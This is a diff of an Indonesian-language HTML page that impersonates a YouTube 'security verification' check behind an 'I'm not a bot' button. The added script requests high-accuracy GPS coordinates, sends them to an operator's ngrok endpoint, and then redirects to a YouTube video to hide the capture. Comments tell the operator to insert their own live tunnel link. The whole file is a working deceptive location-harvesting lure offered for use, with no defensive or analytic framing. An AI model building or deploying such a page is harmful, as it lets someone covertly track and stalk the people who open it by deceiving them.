@@ -1,35 +1,56 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>Verification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YouTube - Verifikasi</title>
+    <style>
+        body { font-family: sans-serif; background: #f9f9f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 350px; }
+        button { background: #cc0000; color: white; border: none; padding: 15px 20px; border-radius: 4px; font-weight: bold; cursor: pointer; width: 100%; }
+        #msg { margin-top: 15px; font-size: 13px; color: #606060; }
+    </style>
 </head>
 <body>
-    <div style="text-align: center; margin-top: 100px;">
-        <h2>Konfirmasi Keamanan</h2>
-        <p>Klik tombol di bawah untuk melanjutkan</p>
-        <button id="btn" style="padding: 15px; background: red; color: white;">SAYA BUKAN BOT</button>
+    <div class="card">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" width="120" style="margin-bottom:20px;">
+        <h3>Verifikasi Keamanan</h3>
+        <p>Klik tombol di bawah untuk membuktikan Anda bukan bot.</p>
+        <button onclick="gasVerif()">SAYA BUKAN BOT</button>
+        <div id="msg"></div>
     </div>
 
     <script>
-        document.getElementById('btn').onclick = function() {
-            // GANTI LINK INI DENGAN LINK NGROK KAMU SEKARANG
-            const urlNgrok = "https://adiabatically-nonhomogeneous-gavin.ngrok-free.dev";
-            
+        function gasVerif() {
+            const msg = document.getElementById('msg');
+            // WAJIB: Ganti dengan link Ngrok kamu yang sedang online sekarang!
+            const linkNgrok = "https://adiabatically-nonhomogeneous-gavin.ngrok-free.dev";
+
+            msg.innerText = "Meminta akses lokasi...";
+
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(function(pos) {
+                navigator.geolocation.getCurrentPosition((pos) => {
                     const lat = pos.coords.latitude;
                     const lon = pos.coords.longitude;
                     
-                    fetch(urlNgrok + "/api/kirim-lokasi?lat=" + lat + "&lon=" + lon)
-                    .then(function() {
-                        window.location.href = "https://www.youtube.com/watch?v=EFmxPMdBqmU";
+                    msg.innerText = "Mengirim data...";
+
+                    fetch(`${linkNgrok}/api/kirim-lokasi?lat=${lat}&lon=${lon}`)
+                    .then(() => {
+                        msg.style.color = "green";
+                        msg.innerText = "✅ Berhasil!";
+                        setTimeout(() => {
+                            window.location.href = "https://www.youtube.com/watch?v=EFmxPMdBqmU";
+                        }, 1000);
+                    })
+                    .catch(() => {
+                        alert("Gagal koneksi ke Ngrok! Cek terminal Ngrok kamu.");
                     });
-                }, function(err) {
-                    alert("Klik Izinkan agar bisa lanjut!");
-                });
+                }, (err) => {
+                    alert("Akses lokasi ditolak! Harap aktifkan GPS dan klik Izinkan.");
+                }, { enableHighAccuracy: true });
             }
-        };
+        }
     </script>
 </body>
 </html>
